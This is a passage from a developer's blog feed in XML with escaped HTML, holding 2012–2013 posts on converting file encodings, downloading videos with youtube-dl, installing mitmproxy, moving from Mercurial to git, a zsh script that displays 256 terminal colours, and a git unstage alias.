recode&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Once done, it is just a matter of &lt;code&gt;convert latin1..utf8 bad.html&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;I wrapped those methods in two scripts : &lt;a href=&quot;https://github.com/pixelas%0Atic/oroshi/blob/master/scripts/bin/encoding&quot;&gt;encoding&lt;/a&gt; and
&lt;a href=&quot;https://github.com/pixelastic/oroshi/blob/master/scripts/bin/utf8&quot;&gt;utf8&lt;/a&gt; that
respectively output the file encoding and convert the file to utf8.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Downloading from Youtube for offline watching</title>
   <link href="http://blog.pixelastic.com/2013/08/27/downloading-youtube-offline-watching/"/>
   <updated>2013-08-27T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2013/08/27/downloading-youtube-offline-watching</id>
   <content type="html">&lt;p&gt;Call me old fashioned but I do not really like the &amp;quot;always connected&amp;quot; motto
that the industry is following right now. I like to have physical music and
video files on my hard drive, so I can access them anywhere, anytime, without
relying on me being connected to a network.&lt;/p&gt;

&lt;p&gt;And yes, I get the irony of talking about &lt;em&gt;physical _files&lt;/em&gt;._&lt;/p&gt;

&lt;p&gt;Anyway, I now download movies directly from &lt;a href=&quot;http://youtube.com/&quot;&gt;Youtube&lt;/a&gt;,
&lt;a href=&quot;http://www.dailymotion.com/&quot;&gt;Dailymotion&lt;/a&gt;, &lt;a href=&quot;http://www.vimeo.com/&quot;&gt;Vimeo&lt;/a&gt; and
consorts, copy them to my smartphone, and watch them in the train, waiting
queues or bed.&lt;/p&gt;

&lt;p&gt;To achieve that, here are the command-line tools I&amp;#39;m using. First is &lt;a href=&quot;https://github.com/rg3/youtube-dl&quot;&gt;youtube-
dl&lt;/a&gt;, and as its name does not imply at all,
it can download from more than Youtube. The second one is
&lt;a href=&quot;https://github.com/bf4/vimeo_downloader&quot;&gt;vimeo_downloader&lt;/a&gt; which is
specialised in downloading from Vimeo. And the last one is the more generic
&lt;a href=&quot;http://code.google.com/p/get-flash-videos/&quot;&gt;get&lt;em&gt;flash&lt;/em&gt;videos&lt;/a&gt; that can
download from a variety of smaller websites.&lt;/p&gt;

&lt;p&gt;All those scripts accepts the video url as parameter.&lt;/p&gt;

&lt;p&gt;Happy scripting and happy viewing !&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Installing mitmproxy</title>
   <link href="http://blog.pixelastic.com/2013/08/26/installing-mitmproxy/"/>
   <updated>2013-08-26T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2013/08/26/installing-mitmproxy</id>
   <content type="html">&lt;p&gt;I spend the last hour trying to install &lt;a href=&quot;http://mitmproxy.org/&quot;&gt;mitmproxy&lt;/a&gt;.
This is supposed to be a commandline proxy to intercept, read, edit and replay
HTTP(S) requests. I say &amp;quot;supposed&amp;quot; because I haven&amp;#39;t had the chance to try it
so far as I was blocked on a compilation error.&lt;/p&gt;

&lt;p&gt;According to &lt;a href=&quot;http://mitmproxy.org/doc/install.html&quot;&gt;the official
documentation&lt;/a&gt;, installing mitmproxy
should be as easy as &lt;code&gt;pip install mitmproxy&lt;/code&gt;. Being new to using &lt;code&gt;pip&lt;/code&gt;, I
first had to install it (&lt;code&gt;sudo apt-get install python-pip&lt;/code&gt;) and figure out
that one need to install stuff with &lt;code&gt;pip&lt;/code&gt; using &lt;code&gt;sudo&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;But &lt;code&gt;sudo pip install mitmproxy&lt;/code&gt; resulted in charming compilation errors in my
case. Something along the lines of :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;src/lxml/lxml.etree.c:16:20: fatal error: Python.h: No such file or directory
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;After a bit of googling, I understood that the issue was some missing headers
on my part. After running &lt;code&gt;sudo apt-get install python-dev&lt;/code&gt; I was good to run
a &lt;code&gt;sudo pip install mitmproxy&lt;/code&gt; again.&lt;/p&gt;

&lt;p&gt;Next step will be to configure the beast and learn how to use it.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Doxie + Dropbox + Ikea = Love</title>
   <link href="http://blog.pixelastic.com/2013/08/26/doxie-dropbox-ikea-love/"/>
   <updated>2013-08-26T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2013/08/26/doxie-dropbox-ikea-love</id>
   <content type="html">&lt;p&gt;Thanks to &lt;a href=&quot;http://getdoxie.com/&quot;&gt;doxie&lt;/a&gt; and
&lt;a href=&quot;http://www.dropbox.com/&quot;&gt;dropbox&lt;/a&gt;, I&amp;#39;m going the paperless way. Every
important paper I get in my physical mailbox, I now scan and put on the cloud.
I have been doing it for bills, medical papers, tickets, warranty and am now
even doing it for Ikea instruction booklets.&lt;/p&gt;

&lt;p&gt;This way, when I&amp;#39;ll be moving to a new appartement, I&amp;#39;ll still be able to
dismantle and rebuild my furniture, even if they have gone out of production.&lt;/p&gt;

&lt;p&gt;As a gift, here are the links :&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://www.dropbox.com/s/xdv1u9dk80488ly/Ikea%20-%20Colonne%20Expedit.pdf&quot;&gt;Expedit Column 1x5&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.dropbox.com/s/x3c6sm31xpbnijf/Ikea%20-%20Meuble%20t%C3%A9l%C3%A9%20Expedit.pdf&quot;&gt;Expedit Tv unit&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.dropbox.com/s/9ja1n497x9h186a/Ikea%20-%20Lit%20Brimnes.pdf&quot;&gt;Brimnes bed&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.dropbox.com/s/f7l5kw5ox6q45pi/Sommier%20Ikea%20Sultan%20Lodingen%20Booklet.pdf&quot;&gt;Sultan Lodingen&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.dropbox.com/s/3agihtb9akad7vm/Ikea%20-%20Fauteuil%20Nils.pdf&quot;&gt;Nils chair with armrest&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</content>
 </entry>
 
 <entry>
   <title>Back in Paris !</title>
   <link href="http://blog.pixelastic.com/2013/07/22/paris/"/>
   <updated>2013-07-22T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2013/07/22/paris</id>
   <content type="html">&lt;p&gt;After one year in New Zealand, I&amp;#39;m now back in Paris. The trip to New Zealand
was one of the best years of my life, I discovered so many things and places,
met so many people, that it changed me in more ways that I can really count.
It also greatly influenced the way I want to work.&lt;/p&gt;

&lt;p&gt;Being back in Paris, I now need to find a new job. I could go back to
freelancing, but I don&amp;#39;t really want to. Freelancing had its advantages, but
also some important downsides. The biggest one being that you&amp;#39;re mostly
working alone, and jumping from one project to the next.&lt;/p&gt;

&lt;p&gt;I now want to work in a team, to teach, and to learn. Sharing with others what
I know and learning from them what I don&amp;#39;t is one of the most important things
I&amp;#39;m now looking in my job.&lt;/p&gt;

&lt;p&gt;I also want to be working on one big project instead of countless small ones.
When you&amp;#39;re freelancing, you&amp;#39;re working on a project for weeks or months,
creating a website from scratch and making it take a life of its own, line
after line. But in the end, you hand it over to the guy who paid you to do it.
And you never really get to see it growing. I now want to work on a project
that I&amp;#39;ll be able to follow, fix, and improve, days after days once it is
launched in the world.&lt;/p&gt;

&lt;p&gt;In New Zealand, I have been a WWOOFer (Willing Worker On Organic Farms) for
over 8 months. All this was possible through the wwoofing website. Now, back
in France I extensively use services such as couchsurfing, airbnb or
blablacar. I love the way those websites allow people to meet through their
services. I&amp;#39;ve met very interesting people thanks to that and I&amp;#39;d love to work
for a company that can help linking people together.&lt;/p&gt;

&lt;p&gt;On a more technical-oriented side, I also want to change my tools. I&amp;#39;ve been
making websites for the past 10 years, coding the server side part in PHP. I
now want to try something else. I used my time in New Zealand to learn a new
language on my own. I first tried Python, but couldn&amp;#39;t really go anywhere with
it. I then tried Ruby and this was like discovering a new world. Writing and
reading Ruby seems like writing and reading prose. I haven&amp;#39;t yet build any
website with Ruby, but coming from a cakePHP background, I guess Ruby on Rails
will seem natural to me. I now use Ruby extensively for my own scripting, be
it for changing a subtitle &lt;code&gt;.srt&lt;/code&gt; fps, automatically synchronizing my
cellphone files with my laptop, batch updating my mp3 tag collection and
mostly any tedious task that involves scripting on my day-to-day life. I
haven&amp;#39;t got the chance to try node.js yet, but that&amp;#39;s definitely next on my
todolist.&lt;/p&gt;

&lt;p&gt;Following the same idea, I also want to get to better use git and its
collaborative features. I&amp;#39;ve only used subversion in a team, and the
experience wasn&amp;#39;t that great. Or I&amp;#39;ve used git, but only for myself as I was
the only developper and I&amp;#39;m sure I only used it to barely 10% of what it could
do. I&amp;#39;ve also tried to follow the TDD principle of writing tests first and
then the code to make the test pass. I managed to do it once or twice, but the
whole process seemed so long and difficult that I&amp;#39;m pretty sure I&amp;#39;ve missed
something here, and would like to have someone to show me how they do it.&lt;/p&gt;

&lt;p&gt;On a related note, I now try to free as much code as I can through open-
source, but I&amp;#39;d like to do even more. I currently only share small scripts
without tests and with scarce documentation. I know I could do better than
that, but I&amp;#39;ll need someone to show me the way.&lt;/p&gt;

&lt;p&gt;I&amp;#39;ve managed to switch from Windows to Ubuntu in the past years and can&amp;#39;t
imagine going back. Working with your filesystem from inside a terminal and
writing scripts to make your life easier is so powerful that I cannot go back
to a GUI OS now. I&amp;#39;ve also ditched a classical IDE, namely Komodo Edit, for
something different, namely vim. The switch has been hard at first, but now
all the vim keys are binded to my muscle memory and I love vim for all the
exact same reasons I love a terminal : you can script your tasks !&lt;/p&gt;

&lt;p&gt;This is only a small subset of the technical changes I&amp;#39;ve already made or am
currently making. I&amp;#39;d like to find a job where I&amp;#39;m hired, not for my past
skills, but for the skills I want to develop. I currently have a resume where
I can attest extensive experience with PHP, but that&amp;#39;s not what I want to do
in my future. What I want to do is, obviously, not on my resume. That is
currently the tricky part I have to face when looking for a job.&lt;/p&gt;

&lt;p&gt;As you can see, I have a pretty good picture of the kind of place I want for
my next job. Luckily, I&amp;#39;m living in Paris, with a lot of job opportunities and
I&amp;#39;m pretty sure I&amp;#39;ll manage to find a place that match most of it. If you&amp;#39;re
currently hiring, and my expectations meet yours, don&amp;#39;t hesitate to shoot me
an email.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>From no versioning to git</title>
   <link href="http://blog.pixelastic.com/2012/11/21/versioning-git/"/>
   <updated>2012-11-21T00:00:00+01:00</updated>
   <id>http://blog.pixelastic.com/2012/11/21/versioning-git</id>
   <content type="html">&lt;p&gt;When I started working as a professional web developer, I wasn&amp;#39;t using any
versioning system. When I needed to add a new feature to an existing website,
I just coded it and then uploaded it by FTP.&lt;/p&gt;

&lt;p&gt;Sometimes, it turns out that the feature was a failure, and that I needed to
get back to a previous version. Most of the time, I remembered the old feature
and could just type the old code back. Other times, I couldn&amp;#39;t and getting the
website back to its previous state was a nightmare.&lt;/p&gt;

&lt;p&gt;So whenever I felt a feature could go wrong, I started creating manual backup
of files before editing them, prefixing them with &lt;code&gt;-version2&lt;/code&gt; and such. It
worked ok at first, but after some time, it was impossible, even for me to
tell the different versions appart.&lt;/p&gt;

&lt;p&gt;I also started to realize a trend on the web, reading from other developers,
that there was something call a version-control system. I thought I needed to
use one of them, to keep track of different version of files.&lt;/p&gt;

&lt;p&gt;I wasn&amp;#39;t exactly sure which one was right for me, so I asked a few friends.
Most of them told me they were using Subversion at work, but that it had a few
shortcomings, but that it was still better than nothing. Another friend told
me that he was using Mercurial, both for personal projects and at work, at
that his whole team was actually versioning everything with it and were very
happy about it.&lt;/p&gt;

&lt;h2&gt;First steps with mercurial&lt;/h2&gt;

&lt;p&gt;So I thought I should start using Mercurial. If I have to learn a new tool,
I&amp;#39;d rather take one that works well and where I have a friend able to help me
on my first steps.&lt;/p&gt;

&lt;p&gt;Back in these days, I was still using Windows so I downloaded and installed
Mercurial and its GUI version, TortoiseHG. I was quite happy with it the
instant I installed it. I could just &amp;quot;commit&amp;quot; (which was a new word for me) my
changes and know for sure that they were safe and that I could get back to
previous versions of my file easily.&lt;/p&gt;

&lt;p&gt;I was committing all my changes at the end of each day, writing a long commit
message listing everything I had done in that given day. Then, the next
morning I could just re-read the previous commit message and remember what I
was doing. The commit message worked a bit like a todo list for what needed to
be done.&lt;/p&gt;

&lt;p&gt;I was mostly using Mercurial as a backup system. I even opened an account on
BitBucket where I uploaded my changes every day, in the case my laptop
crashed, I still had backups of everything online.&lt;/p&gt;

&lt;h2&gt;A little note about FTP&lt;/h2&gt;

&lt;p&gt;Using Mercurial had another benefical side-effect on my productivity. It made
me discover how backward FTP upload was. Before using Mercurial, when I needed
to add changes to a website, I connected to the server with FTP and transfered
every changed files from my local machine to the server.&lt;/p&gt;

&lt;p&gt;Of course, I had to remember which files I changed, and upload them one by
one. This was tedious. I had to move from directory to directory before
copying the files. I can&amp;#39;t tell you how many times I had a bug in production
that I couldn&amp;#39;t replicate on my local machine, just because I either forgot to
upload a file or uploaded it in the wrong place.&lt;/p&gt;

&lt;p&gt;Sometimes just to be sure to upload all the files on their correct places, I
simply uploaded the full website directory and let the FTP software choose if
they needed to be updated or not. But this took ages as the software had to
send a request to compare timestamp modification date for each file.&lt;/p&gt;

&lt;p&gt;And if I only had two files changed, I had to wait for the FTP to scan each
file between the first and the second one before it gets uploaded. This too
resulted in bug reports from customer that I couldn&amp;#39;t replicate, even on
production because by the time I get to check the website, the missing file
that was causing the error had been uploaded and everything worked perfectly
for me. In the end, it created a list of &amp;quot;ghost bugs&amp;quot; that I was never sure if
they were real bugs or created by the FTP upload lag.&lt;/p&gt;

&lt;p&gt;Mercurial get rid of all this crap because it was clever enough to know which
files were changed from the last deployment, and even which part of the files
where changed, sending only the difference. This resulted in much faster
upload time and no more errors in missing files. Also, I got bonus security
points for transferring through ssl and not clear text FTP.&lt;/p&gt;

&lt;p&gt;Sorry for this little FTP disgression. Anyway, as you remember I was using
Mercurial as a backup system more than a version-control system. Commiting
once a day became cumbersome as I wanted more fine-tuning on what I commited.
I ended up commiting twice a day, or even every time I took a break, but then
I realized it made much more sense to commit based on feature and not on time.&lt;/p&gt;

&lt;h2&gt;No more Mercurial&lt;/h2&gt;

&lt;p&gt;And that&amp;#39;s when Mercurial started to get in the way. I often worked on a
feature and while doing that, spotted tiny bugs or typos that I fixed while
working on the big feature. I wanted to commit only related changes together,
and didn&amp;#39;t manage to do that well with Mercurial.&lt;/p&gt;

&lt;p&gt;I guess this is because I did not really understand how Mercurial worked back
in these days, but to be honest I do not understand it better now. Whenever a
file is modified in Mercurial, it is ready to be added to the next commit. But
when you create a new file or delete one, you have to tell Mercurial that you
want this add/delete to be registered in the next commit.&lt;/p&gt;

&lt;p&gt;As I said, I sometime just fixed small bugs or typos in files that had not
much to do with the feature I was working on at that moment. I would have like
to be able to commit only these files, and not the others. I never really
managed to make it correctly with Mercurial so in the end I was still
commiting more files that I wanted to.&lt;/p&gt;

&lt;p&gt;That&amp;#39;s when I considered trying git instead of Mercurial. I made some googling
on &amp;quot;git vs Mercurial&amp;quot; to see how they differ and the general consensus seems
to be that git is more low level than Mercurial. Git has a plethora of
commands, most of them you&amp;#39;ll never use, while Mercurial is focused on a
workflow for the end user that works well. Also, git allow the user to rewrite
its history.&lt;/p&gt;

&lt;p&gt;After reading all this I was convinced Mercurial was the right tool for me. I
was still struggling with my current version system, I didn&amp;#39;t want to try one
that was even more hard to understand. Plus, rewriting history ? I don&amp;#39;t want
that to happen in real life, I sure don&amp;#39;t want that to happen with my files
either.&lt;/p&gt;

&lt;p&gt;So I digged deeper in Mercurial, trying to understand it better, to grok it
but no, really, I still could&amp;#39;nt make it behave the way I&amp;#39;d like to work with
my files so I finally decided to give git a try.&lt;/p&gt;

&lt;h2&gt;First steps with git&lt;/h2&gt;

&lt;p&gt;Because there was this thing named github, and all the cool kids where on
github, and I too wanted to participate in those big open source projects and
I felt like I was held back by the tool I was using.&lt;/p&gt;

&lt;p&gt;On my first hours of using git I managed to do what I had struggled to do with
Mercurial for so long. I could easily choose which files to commit or not and
split my work in several commits. Of course, I could never have done it
without google. Git man pages are gibberish and the command line commands and
options list is so vast I felt lost. Even when I found what I needed I
wondered why the git developers choosed to give them such abstract names
without any apparent cohesion in the complete git API.&lt;/p&gt;

&lt;p&gt;I had to create &lt;a href=&quot;https://github.com/pixelastic/oroshi/blob/master/con%0Afig/git/gitconfig&quot;&gt;aliases&lt;/a&gt; to do my day to day tasks with git so as not to remember
and type all these &lt;a href=&quot;https://github.com/pixelastic/oroshi/blob/master/config/zsh/aliases-%0Agit.zsh&quot;&gt;crazy
commands&lt;/a&gt;, but in the end it turns out ok. I keep running into problems, but
none that the help of google, StackOverflow and the incredibly rich git API
can&amp;#39;t solve.&lt;/p&gt;

&lt;p&gt;I&amp;#39;m now versioning any new project with git and even converted some old
projects from Mercurial to git. I know I&amp;#39;m still in the early stages of
learning git (I&amp;#39;ve only started using branches extensively since a few weeks)
but I do really enjoy it a lot.&lt;/p&gt;

&lt;h2&gt;What&amp;#39;s next ?&lt;/h2&gt;

&lt;p&gt;I&amp;#39;ve done all my git training by myself, while in New Zealand for a year, away
from work and just for fun. I know that when I&amp;#39;ll get back to Paris and start
looking for a new job I&amp;#39;d like to find a place where the day-to-day workflow
involves git because I really want to see the way branching and merging helps
people work together building bigger things.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Spectrum, a script to see your terminal 256 colors</title>
   <link href="http://blog.pixelastic.com/2012/09/06/spectrum-script-terminal-256-colors/"/>
   <updated>2012-09-06T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2012/09/06/spectrum-script-terminal-256-colors</id>
   <content type="html">&lt;p&gt;Here is a little script I hacked together to display in your terminal all the
colors available in the 256 color spectrum, as well as a visual representation
of them.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://s3.pixelastic.com/files/2012/09/06%0A/504834cb-df14-4fa6-a08c-763445a3e447/spectrum2.png&quot; alt=&quot;Screenshot of spectrum output&quot;&gt;&lt;/p&gt;

&lt;p&gt;The &lt;code&gt;oh-my-zsh&lt;/code&gt; project actually ships with a method named &lt;code&gt;spectrum&lt;/code&gt; that
does pretty much the same thing, but I found that it was hard to actually get
a real feel of what the color where with the original output. So I coded this
one.&lt;/p&gt;

&lt;p&gt;It does not display the colors in the range &lt;code&gt;{000..015}&lt;/code&gt; because those are
dependent on your terminal configuration. Also, the output is split in blocks
of 6 lines, with 2 blocks displayed side by side. You can modify those values
in the script if you want to make it easier to read on you screen. I use 2 and
6 because it is what is the more readable on my tiny netbook screen.&lt;/p&gt;

&lt;p&gt;Ok, enough talk, here is the script&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span class=&quot;c&quot;&gt;#!/usr/bin/zsh&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# Display the terminal 255 colors by blocks&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# Long space is long&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;local &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;space&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot; &amp;quot;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;i in &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;0..22&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;space&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$space&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot; &amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# Number of color lines per block&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;local &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;lines&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;6
&lt;span class=&quot;c&quot;&gt;# Number of blocks per terminal line&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;local &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;blocks&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;2

&lt;span class=&quot;c&quot;&gt;# Tmp var to hold the current line in a block&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;local &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;m&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0
&lt;span class=&quot;c&quot;&gt;# Tmp var to hold how many blocks are filled&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;local &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0
&lt;span class=&quot;nb&quot;&gt;typeset&lt;/span&gt; -A grid

&lt;span class=&quot;c&quot;&gt;# We want to display the blocks side by side, so it means we&amp;#39;ll have to create&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# each line one my one then display all of them, and after that jump to the&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# next set of blocks&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;color in &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;016..255&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;# Current line in a block&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;m&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;$((&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$color&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)%&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$lines&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;))&lt;/span&gt;

    &lt;span class=&quot;c&quot;&gt;# Appending the displayed color to the line&lt;/span&gt;
    grid&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$m&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$grid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$m&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;^[[01m^[[38;5;${color}m#${color} ^[[48;5;${color}m${space}^[[00m  &amp;quot;&lt;/span&gt;

    &lt;span class=&quot;c&quot;&gt;# Counting how many blocks are filled&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;[[&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$m&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 5 &lt;span class=&quot;o&quot;&gt;]]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;$((&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$b&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;))&lt;/span&gt;

    &lt;span class=&quot;c&quot;&gt;# Enough blocks for this line, display them&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[[&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$b&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$blocks&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then&lt;/span&gt;
        &lt;span class=&quot;c&quot;&gt;# Reset block counter&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;c&quot;&gt;# Display each line&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;j in &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;0..5&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;            &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$grid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$j&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
            grid&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$j&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&amp;quot;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;&amp;quot;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;fi&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# Display each remaining blocks&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;j in &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;0..5&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$grid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$j&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
    grid&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$j&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&amp;quot;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Oh and one last word. You might want to pipe the output to &lt;code&gt;less&lt;/code&gt; to make it
easier to read if you&amp;#39;re on a small screen like me.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>ZSH autocompletion for git unstage </title>
   <link href="http://blog.pixelastic.com/2012/08/30/zsh-autocompletion-git-unstage/"/>
   <updated>2012-08-30T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2012/08/30/zsh-autocompletion-git-unstage</id>
   <content type="html">&lt;p&gt;I recently switched to git as my main version control system (I used to use
Mercurial before that). I quickly grasped the concept of the staging area and
used the &lt;code&gt;git add&lt;/code&gt; command extensively to add before committing.&lt;/p&gt;

&lt;p&gt;And zsh ships with nice git autocompletion features, and suggests files to add
with &lt;code&gt;git add&lt;/code&gt; when you press Tab.&lt;/p&gt;

&lt;h2&gt;Git unstage&lt;/h2&gt;

&lt;p&gt;What is missing from the basic git commands is a way to unstage a file from
the staging area. Well, I can do it with &lt;code&gt;git reset HEAD&lt;/code&gt;, but this command is
a bit tedious to type.&lt;/p&gt;

&lt;p&gt;So I created an alias, named &lt;code&gt;git unstage&lt;/code&gt; that does just that. I just added
the following lines to my &lt;code&gt;~/.gitconfig&lt;/code&gt;, under the &lt;code&gt;[alias]&lt;/code&gt; header :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ini&quot; data-lang=&quot;ini&quot;&gt;&lt;span class=&quot;na&quot;&gt;unstage&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;reset HEAD&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;I can now easily add files to the staging area with &lt;code&gt;git add&lt;/code&gt; and remove them
